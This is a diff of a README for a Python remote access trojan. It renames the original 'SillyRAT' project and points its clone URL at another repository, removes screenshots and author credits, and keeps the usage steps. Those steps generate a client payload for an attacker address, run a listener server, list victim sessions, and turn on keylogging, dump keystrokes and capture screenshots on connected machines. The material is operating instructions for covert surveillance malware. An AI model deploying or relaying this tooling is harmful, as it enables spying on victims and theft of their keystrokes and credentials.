@@ -16,8 +16,8 @@
 The tool is tested on **Parrot OS** with **Python 3.8**. 
 Follow the steps for installation:
 ```
-$ git clone https://github.com/hash3liZer/SillyRAT.git
-$ cd SillyRAT/
+$ git clone https://github.com/starcheek/rat.git
+$ cd rat/
 $ pip3 install -r requirements.txt
 ```
 
@@ -40,14 +40,12 @@ The compiled version has to generated on the respective platform. For example, y
 $ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
 ```
 
-<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89173322-b74dc680-d5a1-11ea-8b3b-e5aa83cfbda1.png"></h6>
-
 Replace your IP Address and Port on above commands. 
 
 ### Running Server
 The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
 ```
-$ python3 sillyrat.py bind --address 0.0.0.0 --port 2999
+$ python3 server.py bind --address 0.0.0.0 --port 2999
 ```
 
 ### Connections
@@ -56,8 +54,6 @@ All the connections will be listed under **sessions** command:
 $ sessions
 ```
 
-<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89171634-152cdf00-d59f-11ea-83a6-0344f370113a.png"></h6>
-
 You can connect to you target session with **connect** command and launch one of available commands: 
 ```
 $ connect ID
@@ -65,8 +61,6 @@ $ keylogger on
 $ keylogger dump
 $ screenshot
 ```
-
-<h6 align="center"><img src="https://user-images.githubusercontent.com/29171692/89172191-d9464980-d59f-11ea-988c-9986b52642e7.png"></h6>
 
 ### Help
 Get a list of available commands: 
@@ -79,6 +73,3 @@ Help on a Specific Command:
 $ help COMMAND
 ```
 
-### Support
-Twitter: <a href="//twitter.com/hash3liZer">@hash3liZer</a><br>
-Discord: TheFlash2k#0407
